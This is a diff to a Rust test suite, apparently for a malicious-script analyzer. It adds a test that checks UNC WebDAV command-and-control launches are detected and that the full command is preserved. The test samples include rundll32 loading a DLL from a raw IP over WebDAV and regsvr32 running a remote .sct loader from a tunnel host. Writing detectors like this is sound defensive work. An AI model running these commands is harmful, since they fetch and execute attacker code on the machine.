@@ -27907,6 +27907,27 @@ mod unc_webdav_tests {
     }
 
     #[test]
+    fn unc_webdav_preserves_full_command_context() {
+        let padding = "A".repeat(260);
+        let script = format!(
+            r#"start "" /b rundll32 \\104.156.149.6@8888\davwwwroot\host.dll,XSSCheckStart {padding}"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::UncWebDavC2 { host, port, command, .. }
+                    if host == "104.156.149.6"
+                        && port == "8888"
+                        && command == script.as_str()
+            )),
+            "full UNC WebDAV command was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn unc_webdav_hostname_ssl() {
         let script = br#"regsvr32 /s \\travel-sagem-distant-potential.trycloudflare.com@SSL\DavWWWRoot\loader.sct"#;
         let report = analyze(script, &Config::default());
